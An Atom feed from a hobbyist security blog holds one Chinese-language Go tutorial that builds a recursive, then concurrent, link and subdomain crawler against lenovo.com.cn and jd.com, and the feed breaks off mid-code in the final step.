<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shu1L&#39;s blog</title>
  
  <subtitle>一只菜鸟白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://shu1l.github.io/"/>
  <updated>2021-04-03T08:23:45.506Z</updated>
  <id>https://shu1l.github.io/</id>
  
  <author>
    <name>Shu1L</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>golang学习--编写爬虫</title>
    <link href="https://shu1l.github.io/2021/04/03/golang-xue-xi-bian-xie-pa-chong/"/>
    <id>https://shu1l.github.io/2021/04/03/golang-xue-xi-bian-xie-pa-chong/</id>
    <published>2021-04-03T08:20:13.000Z</published>
    <updated>2021-04-03T08:23:45.506Z</updated>
    
    <content type="html"><![CDATA[<h2 id="golang–从零学习编写一个爬虫"><a href="#golang–从零学习编写一个爬虫" class="headerlink" title="golang–从零学习编写一个爬虫"></a>golang–从零学习编写一个爬虫</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    学习了一段时间的go，觉得自己应该实际上手写一些东西，之前一直使用在三只师傅python写的jsfinder,就想着用go写一个类似jsfinder的爬虫。</p><h4 id="steps1"><a href="#steps1" class="headerlink" title="steps1"></a>steps1</h4><p>首先实现简单访问并读取页面内容的功能，主要使用net/http模块。</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">func main()&#123;</span><br><span class="line"><span class="attribute">resp,err</span>:=http<span class="variable">.Get</span>("https://www<span class="variable">.lenovo</span><span class="variable">.com</span><span class="variable">.cn</span>")</span><br><span class="line">if err!=nil&#123;</span><br><span class="line">log<span class="variable">.Fatal</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">if resp<span class="variable">.StatusCode</span>!=200 &#123;</span><br><span class="line">log<span class="variable">.Fatal</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">doc,err:=ioutil<span class="variable">.ReadAll</span>(resp<span class="variable">.Body</span>)</span><br><span class="line">resp<span class="variable">.Body</span><span class="variable">.Close</span>()</span><br><span class="line">fmt<span class="variable">.Printf</span>("%s",doc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ioutil.ReadAll</strong> 是一个常用的数据读取方法，经常用来读取http请求的response数据，或者读取文件数据。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210323110459.png" alt=""></p><p>可以看到正常输出了页面内容。</p><h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>​        第二步我们需要对页面进行解析，并提取页面中的js链接。我们可以使用go自带的regexp来进行正则匹配(类似python),这里我使用很方便的第三方包goquery读取HTML代码。</p><p>​    goquery是一个使用go语言写成的HTML解析库，可以让你像jQuery那样的方式来操作DOM文档，使用起来非常的简便。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/PuerkitoBio/goquery"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">resp,err:=http.Get(<span class="string">"https://www.lenovo.com.cn"</span>)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> resp.StatusCode!=<span class="number">200</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">doc,err:=goquery.NewDocumentFromReader(resp.Body) </span><br><span class="line"><span class="comment">// NewDocumentFromReader：读取字符串的HTML代码</span></span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">//Find函数是查找HTML里面所有符合要求的标签。</span></span><br><span class="line">doc.Find(<span class="string">"a"</span>).Each(<span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, s *goquery.Selection)</span></span> &#123;</span><br><span class="line">href, ex := s.Attr(<span class="string">"href"</span>)</span><br><span class="line"><span class="comment">// 使用Attr获取数据所在HTML代码的href属性</span></span><br><span class="line"><span class="keyword">if</span> ex &#123;</span><br><span class="line">fmt.Println(href)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20210323112554.png" alt=""></p><p>可以看到这里成功爬取到了页面的js链接。</p><p>当然这里还有一个更好用的第三方包：<strong>github.com/jackdanger/collectlinks</strong> 可以提取网页中所有的链接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">resp, err := http.Get(<span class="string">"https://www.lenovo.com.cn"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">links := collectlinks.All(resp.Body)</span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">fmt.Println(link)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp.Body.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用下来感觉要比自己写规则爬的全很多。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210327163740.png" alt=""></p><h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>​    第三步我们要对获取到的链接进行处理，首先转化为绝对链接，然后提取出其中的子域名经过去重之后存入新的数组队列中。</p><p>我们这里封装三个函数，分别用来转化绝对路径、判断子域名和去重:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">urlparse</span><span class="params">(href, base <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">uri, err := url.Parse(href)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">" "</span></span><br><span class="line">&#125;</span><br><span class="line">baseUrl, err := url.Parse(base)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">" "</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> baseUrl.ResolveReference(uri).String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>issubdomain</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> reg&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>remove</strong></p><p>去重这里参考了网上数组切片去重的方式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">result = <span class="built_in">append</span>(result, item)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    然后在主函数中再定义一个sublists数组，然后对收集到的js链接调用上述函数进行处理后，将结果保存到数组中输出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"net/url"</span></span><br><span class="line"><span class="string">"regexp"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">first:=<span class="string">"https://www.lenovo.com.cn"</span></span><br><span class="line">resp, err := http.Get(first)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">links := collectlinks.All(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">urls,err:=url.Parse(link)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"lenovo.com"</span>)&#123;</span><br><span class="line">sublists=<span class="built_in">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sublists=remove(sublists)</span><br><span class="line"><span class="keyword">for</span> _,sublist:=<span class="keyword">range</span> sublists&#123;</span><br><span class="line">fmt.Println(sublist)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> reg&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">result = <span class="built_in">append</span>(result, item)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20210327191705.png" alt=""></p><h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>第四步我们实现循环爬取的功能，首先我们将之前的主函数封装为crawl爬虫函数:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">func crawl(uri string) []string &#123;</span><br><span class="line">fmt.Println(uri)</span><br><span class="line">sublists := make([]string, 0)</span><br><span class="line">resp, <span class="keyword">err</span> := http.<span class="built_in">Get</span>(uri)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">Print</span>(<span class="keyword">err</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> resp.StatusCode != 200 &#123;</span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">Print</span>(<span class="keyword">err</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">links := collectlinks.All(resp.Body)</span><br><span class="line">resp.Body.<span class="keyword">Close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">urls,<span class="keyword">err</span>:=url.<span class="keyword">Parse</span>(link)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">err</span>!=nil &#123;</span><br><span class="line"><span class="keyword">log</span>.Println(<span class="keyword">err</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"lenovo.com"</span>)&#123;</span><br><span class="line">sublists=<span class="keyword">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sublists=remove(sublists)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sublists</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在主函数中进行循环爬取：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">func</span> <span class="selector-tag">main</span>() &#123;</span><br><span class="line"><span class="attribute">sublists</span>:=<span class="built_in">make</span>([]string,<span class="number">0</span>)</span><br><span class="line">seen:=<span class="built_in">make</span>(map[string]bool)</span><br><span class="line">sublists = <span class="built_in">append</span>(sublists,<span class="string">"http://www.lenovo.com.cn"</span>)</span><br><span class="line">for <span class="built_in">len</span>(sublists) &gt; <span class="number">0</span> &#123;</span><br><span class="line">items := sublists</span><br><span class="line">sublists = nil</span><br><span class="line">for _, item := range items &#123;</span><br><span class="line">if !seen[item] &#123;</span><br><span class="line">seen[item] = true</span><br><span class="line">sublists = <span class="built_in">append</span>(sublists, crawl(item)...)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里爬了下jd，效果还是挺明显的:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210327195637.png" alt=""></p><p>​    这里在爬取过程会遇到一个异常:dial tcp: lookup help.en.jd.com: no such host,</p><p>意思大概是获取到的域名不能解析，所以我们需要使用defer+recover来捕获异常。防止程序直接退出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">crawl</span><span class="params">(uri <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">fmt.Println(uri)</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">resp, err1 := http.Get(uri)</span><br><span class="line"><span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">links := collectlinks.All(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">urls,err:=url.Parse(link)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"jd.com"</span>)&#123;</span><br><span class="line">sublists=<span class="built_in">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sublists=remove(sublists)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sublists</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">sublists:=<span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>)</span><br><span class="line">seen:=<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line">sublists = <span class="built_in">append</span>(sublists,<span class="string">"https://www.jd.com"</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(sublists) &gt; <span class="number">0</span> &#123;</span><br><span class="line">items := sublists</span><br><span class="line">sublists = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> items &#123;</span><br><span class="line"><span class="keyword">if</span> !seen[item] &#123;</span><br><span class="line">seen[item] = <span class="literal">true</span></span><br><span class="line">sublists=<span class="built_in">append</span>(sublists,crawl(item)...)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> reg&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">result = <span class="built_in">append</span>(result, item)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h4><p>最后一步我们来实现并发功能：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"net/url"</span></span><br><span class="line"><span class="string">"regexp"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">worklist := <span class="built_in">make</span>(<span class="keyword">chan</span> []<span class="keyword">string</span>)</span><br><span class="line">sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">seen := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line">sublists = <span class="built_in">append</span>(sublists, <span class="string">"https://www.jd.com"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; worklist &lt;- sublists &#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> list := <span class="keyword">range</span> worklist &#123;</span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> list &#123;</span><br><span class="line"><span class="keyword">if</span> !seen[link] &#123;</span><br><span class="line">seen[link] 